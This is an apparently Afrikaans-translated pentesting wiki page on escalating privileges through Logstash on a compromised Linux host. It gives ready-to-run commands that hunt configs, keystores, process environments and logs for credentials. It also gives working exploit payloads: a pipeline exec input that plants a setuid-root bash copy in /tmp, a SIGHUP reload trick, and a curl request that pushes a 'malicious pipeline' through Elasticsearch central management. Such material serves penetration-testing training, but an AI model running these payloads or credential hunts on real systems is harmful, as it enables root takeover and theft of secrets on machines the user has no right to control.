# Logstash Privilege Escalation

{{#include ../../banners/hacktricks-training.md}}

## Logstash

Logstash word gebruik om **logs te versamel, te transformeer en te stuur** deur 'n stelsel wat bekend staan as **pipelines**. Hierdie pipelines bestaan uit die **input**, **filter** en **output** fases. 'n Interessante aspek ontstaan wanneer Logstash op 'n gekompromitteerde masjien loop.

### Pipeline Konfigurasie

Pipelines word in die lêer **/etc/logstash/pipelines.yml** gekonfigureer, wat die liggings van die pipeline-konfigurasies lys:
```yaml
# Define your pipelines here. Multiple pipelines can be defined.
# For details on multiple pipelines, refer to the documentation:
# https://www.elastic.co/guide/en/logstash/current/multiple-pipelines.html

- pipeline.id: main
path.config: "/etc/logstash/conf.d/*.conf"
- pipeline.id: example
path.config: "/usr/share/logstash/pipeline/1*.conf"
pipeline.workers: 6
```
Hierdie lêer openbaar waar die **.conf** lêers, wat pipeline-konfigurasies bevat, geleë is. Wanneer 'n **Elasticsearch output module** gebruik word, is dit algemeen dat **pipelines** **Elasticsearch credentials** insluit, wat dikwels uitgebreide bevoegdhede het as gevolg van Logstash se behoefte om data na Elasticsearch te skryf. Wildcards in konfigurasiepaadjies laat Logstash toe om alle ooreenstemmende pipelines in die aangeduide gids uit te voer.

As Logstash met `-f <directory>` begin word in plaas van `pipelines.yml`, **word alle lêers in daardie gids in leksikografiese volgorde aanmekaar gekoppel en as 'n enkele config geparseer**. Dit skep 2 offensiewe implikasies:

- 'n geplaatste lêer soos `000-input.conf` of `zzz-output.conf` kan die manier waarop die finale pipeline saamgestel word verander
- 'n verkeerd gevormde lêer kan verhoed dat die hele pipeline laai, so valideer payloads noukeurig voordat jy op auto-reload staatmaak

### Vinnige enumerasie op 'n gekompromitteerde gasheer

Op 'n masjien waar Logstash geïnstalleer is, ondersoek vinnig:
```bash
ps aux | grep -i logstash
systemctl cat logstash 2>/dev/null
cat /etc/logstash/pipelines.yml 2>/dev/null
cat /etc/logstash/logstash.yml 2>/dev/null
find /etc/logstash /usr/share/logstash -maxdepth 3 -type f \( -name '*.conf' -o -name 'logstash.yml' -o -name 'pipelines.yml' \) -ls
rg -n --hidden -S 'password|passwd|api[_-]?key|cloud_auth|ssl_keystore_password|truststore_password|user\s*=>|hosts\s*=>' /etc/logstash /usr/share/logstash 2>/dev/null
```
Kontroleer ook of die plaaslike moniterings-API bereikbaar is. Standaard bind dit op **127.0.0.1:9600**, wat gewoonlik genoeg is nadat jy op die gasheer ingetree het:
```bash
curl -s http://127.0.0.1:9600/?pretty
curl -s http://127.0.0.1:9600/_node/pipelines?pretty
curl -s http://127.0.0.1:9600/_node/stats/pipelines?pretty
```
Dit gee gewoonlik pipeline IDs, runtime-besonderhede, en bevestiging dat jou gewysigde pipeline gelaai is.

Inlogbewyse wat uit Logstash herwin word, ontsluit gewoonlik **Elasticsearch**, dus kyk na [this other page about Elasticsearch](../../network-services-pentesting/9200-pentesting-elasticsearch.md).

### Privilege Escalation via Writable Pipelines

Om privilege escalation te probeer, identifiseer eers die gebruiker waarop die Logstash-diens loop, gewoonlik die **logstash** gebruiker. Verseker jy voldoen aan **een** van hierdie kriteria:

- Besit **write access** tot 'n pipeline **.conf** lêer **of**
- Die **/etc/logstash/pipelines.yml** lêer gebruik 'n wildcard, en jy kan na die teikenmap skryf

Daarbenewens moet **een** van hierdie voorwaardes vervul wees:

- Vermoë om die Logstash-diens te herbegin **of**
- Die **/etc/logstash/logstash.yml** lêer het **config.reload.automatic: true** gestel

As daar 'n wildcard in die konfigurasie is, laat die skep van 'n lêer wat by daardie wildcard pas, toe om opdragte uit te voer. Byvoorbeeld:
```bash
input {
exec {
command => "whoami"
interval => 120
}
}

output {
file {
path => "/tmp/output.log"
codec => rubydebug
}
}
```
Hier bepaal **interval** die uitvoeringfrekwensie in sekondes. In die gegewe voorbeeld word die **whoami**-opdrag elke 120 sekondes uitgevoer, met sy uitvoer na **/tmp/output.log** gerig.

Met **config.reload.automatic: true** in **/etc/logstash/logstash.yml**, sal Logstash nuwe of gewysigde pipeline-konfigurasies outomaties opspoor en toepas sonder 'n herstart. As daar geen wildcard is nie, kan wysigings steeds aan bestaande konfigurasies gemaak word, maar wees versigtig om ontwrigting te vermy.

### More Reliable Pipeline Payloads

Die `exec` input plugin werk steeds in huidige vrystellings en vereis óf 'n `interval` óf 'n `schedule`. Dit voer uit deur die Logstash JVM te **forking**, sodat as geheue beperk is, jou payload met `ENOMEM` kan faal in plaas van stilweg te loop.

'n Meer praktiese privilege-escalation payload is gewoonlik een wat 'n duursame artefak agterlaat:
```bash
input {
exec {
command => "cp /bin/bash /tmp/logroot && chown root:root /tmp/logroot && chmod 4755 /tmp/logroot"
interval => 300
}
}
output {
null {}
}
```
As jy nie die regte het om te herbegin nie, maar wel 'n sein na die proses kan stuur, ondersteun Logstash ook 'n **SIGHUP**-geaktiveerde herlaai op Unix-agtige stelsels:
```bash
kill -SIGHUP $(pgrep -f logstash)
```
Wees daarvan bewus dat nie elke plugin herlaaivriendelik is nie. Byvoorbeeld, die **stdin** input voorkom outomatiese herlaai, so moenie aanneem dat `config.reload.automatic` jou veranderings altyd sal oppik nie.

### Geheimenisse steel uit Logstash

Voordat jy uitsluitlik op code execution fokus, oes die data waartoe Logstash reeds toegang het:

- Plaintext credentials word dikwels hardcoded binne `elasticsearch {}` outputs, `http_poller`, JDBC inputs, of cloud-related settings
- Secure settings kan in **`/etc/logstash/logstash.keystore`** of in 'n ander `path.settings`-gids gestoor wees
- Die keystore-wagwoord word dikwels deur **`LOGSTASH_KEYSTORE_PASS`** verskaf, en pakketgebaseerde installasies haal dit gewoonlik uit **`/etc/sysconfig/logstash`**
- Environment-variable expansion met `${VAR}` word tydens Logstash-opstart opgelos, dus is die diensomgewing die moeite werd om te inspekteer

Nuttige kontroles:
```bash
ls -l /etc/logstash /etc/logstash/logstash.keystore 2>/dev/null
strings /etc/logstash/conf.d/*.conf 2>/dev/null | head
tr '\0' '\n' < /proc/$(pgrep -o -f logstash)/environ 2>/dev/null | sort
cat /etc/sysconfig/logstash 2>/dev/null
journalctl -u logstash --no-pager 2>/dev/null | tail -n 200
ls -lah /var/log/logstash 2>/dev/null
```
Dit is ook die moeite werd om te kontroleer omdat **CVE-2023-46672** getoon het dat Logstash onder sekere omstandighede sensitiewe inligting in logs kon aanteken. Op 'n post-exploitation host kan ou Logstash-logs en `journald`-inskrywings dus credentials openbaar maak, selfs al verwys die huidige config na die keystore in plaas daarvan om geheime inline te stoor.

### Misbruik van Gekentraliseerde Pipeline-bestuur

In sommige omgewings vertrou die host glad nie op plaaslike `.conf`-lêers nie. As **`xpack.management.enabled: true`** gekonfigureer is, kan Logstash sentraal bestuurde pipelines van Elasticsearch/Kibana haal, en nadat hierdie modus aangeskakel is, is plaaslike pipeline-configs nie meer die bron van waarheid nie.

Dit beteken 'n ander aanvalspad:

1. Kry Elastic credentials uit plaaslike Logstash-instellings, die keystore of logs
2. Kontroleer of die rekening die **`manage_logstash_pipelines`** cluster privilege het
3. Skep of vervang 'n sentraal bestuurde pipeline sodat die Logstash host jou payload by sy volgende poll interval uitvoer

Die Elasticsearch API wat vir hierdie funksie gebruik word is:
```bash
curl -X PUT http://ELASTIC:9200/_logstash/pipeline/pwned \
-H 'Content-Type: application/json' \
-u user:password \
-d '{
"description": "malicious pipeline",
"pipeline": "input { exec { command => \"id > /tmp/.ls-rce\" interval => 120 } } output { null {} }",
"pipeline_metadata": {"type": "logstash_pipeline", "version": "1"},
"pipeline_settings": {"pipeline.workers": 1, "pipeline.batch.size": 1}
}'
```
Dit is veral nuttig wanneer plaaslike lêers slegs-lees is, maar Logstash reeds geregistreer is om pipelines op afstand te haal.

## Verwysings

- [Elastic Docs: Reloading the Config File](https://www.elastic.co/guide/en/logstash/8.19/reloading-config.html)
- [Elastic Docs: Configure Centralized Pipeline Management](https://www.elastic.co/guide/en/logstash/8.19/configuring-centralized-pipelines.html)

{{#include ../../banners/hacktricks-training.md}}
